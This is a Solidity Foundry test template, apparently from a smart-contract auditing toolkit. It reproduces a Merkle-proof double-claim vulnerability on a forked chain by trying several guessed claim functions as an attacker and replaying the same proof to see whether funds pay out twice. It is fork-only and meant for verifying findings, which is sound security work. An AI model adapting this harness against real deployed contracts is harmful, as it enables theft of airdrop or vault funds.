// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";

/// @title Fallback PoC -- Merkle claim double-claim (same proof twice)
/// @notice Claim contracts must mark a proof / nullifier as USED. If the
///         claimed check is missing (or keyed wrong), the SAME Merkle proof
///         claims TWICE -- the attacker drains the airdrop / vault.
/// @dev FORK-ONLY. Copy to foundry/test/Exploit.t.sol and run via
///      scripts/run-fork-poc.sh. TODO: set PROOF / AMOUNT / adapt claim()
///      to the target's real claim signature.

contract PoC is Test {
    address public target;
    uint256 public forkBlock;
    // TODO: a valid Merkle proof + amount for the attacker on this fork.
    bytes32[] public proof;
    uint256 public constant AMOUNT = 0;

    function setUp() public {
        target = vm.envOr("POC_TARGET", address(0));
        require(target != address(0), "POC_TARGET not set");
        forkBlock = vm.envOr("POC_FORK_BLOCK", uint256(0));
        string memory rpc = vm.envOr("POC_RPC_URL", string("mainnet"));
        uint256 forkId = forkBlock == 0 ? vm.createFork(rpc) : vm.createFork(rpc, forkBlock);
        vm.selectFork(forkId);
    }

    function test_forkSanity() public {
        assertGt(target.code.length, 0, "target has no code at this fork block");
    }

    /// The claimant's value at the target: native ETH plus the target's own
    /// ERC-20 balance when it has one. A claim that pays nothing has not landed.
    function _valueOf(address who) internal view returns (uint256) {
        uint256 total = who.balance;
        (bool ok, bytes memory ret) =
            target.staticcall(abi.encodeWithSignature("balanceOf(address)", who));
        if (ok && ret.length >= 32) total += abi.decode(ret, (uint256));
        return total;
    }

    /// One claim attempt. Success is the CLAIMANT'S VALUE moving — never the
    /// call returning. Returns the calldata that worked so the replay uses the
    /// same selector.
    function _claimOnce(address claimant, uint256 before, string memory label, bytes memory data)
        internal
        returns (bytes memory)
    {
        vm.prank(claimant);
        (bool ok,) = target.call(data);
        console.log("tried", label, ok ? "call returned" : "call reverted");
        if (ok && _valueOf(claimant) > before) return data;
        return "";
    }

    /// The claim signature is a GUESS on an unverified target, and one wrong
    /// name reports "not reproduced" for a vulnerability that exists under
    /// another.
    function _tryClaim(address claimant, uint256 before) internal returns (bytes memory used) {
        used = _claimOnce(claimant, before, "claim(bytes32[],uint256)", abi.encodeWithSignature("claim(bytes32[],uint256)", proof, AMOUNT));
        if (used.length > 0) return used;
        used = _claimOnce(claimant, before, "claim(uint256,bytes32[])", abi.encodeWithSignature("claim(uint256,bytes32[])", AMOUNT, proof));
        if (used.length > 0) return used;
        used = _claimOnce(claimant, before, "claim(bytes,uint256)", abi.encodeWithSignature("claim(bytes,uint256)", abi.encodePacked(proof), AMOUNT));
        if (used.length > 0) return used;
        used = _claimOnce(claimant, before, "redeem(uint256,bytes32[])", abi.encodeWithSignature("redeem(uint256,bytes32[])", AMOUNT, proof));
        if (used.length > 0) return used;
        used = _claimOnce(claimant, before, "withdraw(uint256,bytes32[])", abi.encodeWithSignature("withdraw(uint256,bytes32[])", AMOUNT, proof));
        if (used.length > 0) return used;
        return "";
    }

    function test_exploit() public {
        require(AMOUNT > 0, "set AMOUNT + proof to a valid claim for the attacker");

        address attackerEOA = makeAddr("attacker");
        vm.deal(attackerEOA, 1 ether);

        uint256 before = _valueOf(attackerEOA);
        bytes memory used = _tryClaim(attackerEOA, before);
        require(
            used.length > 0,
            "no claim entry point paid the attacker. Tried claim(bytes32[],uint256), claim(uint256,bytes32[]), claim(bytes,uint256), redeem(uint256,bytes32[]), withdraw(uint256,bytes32[]). This does NOT establish safety: the claim signature, proof or amount may differ."
        );
        uint256 afterFirst = _valueOf(attackerEOA);
        require(afterFirst > before, "the claim returned but paid nothing");

        // Same proof, same amount, second time. The double-claim is the VALUE
        // moving again — not the second call returning. A call-success assertion
        // here reports "reproduced" for a target that simply reverted nothing.
        vm.prank(attackerEOA);
        (bool secondOk,) = target.call(used);
        uint256 afterSecond = _valueOf(attackerEOA);
        console.log("first claim paid:", afterFirst - before);
        console.log("second claim (same proof) returned:", secondOk);
        console.log("second claim paid:", afterSecond > afterFirst ? afterSecond - afterFirst : 0);
        assertGt(
            afterSecond,
            afterFirst,
            "the same proof paid only once. This does NOT establish safety: the claim may be gated by a claimed-mapping under another name, or the signature/proof may differ."
        );
    }
}
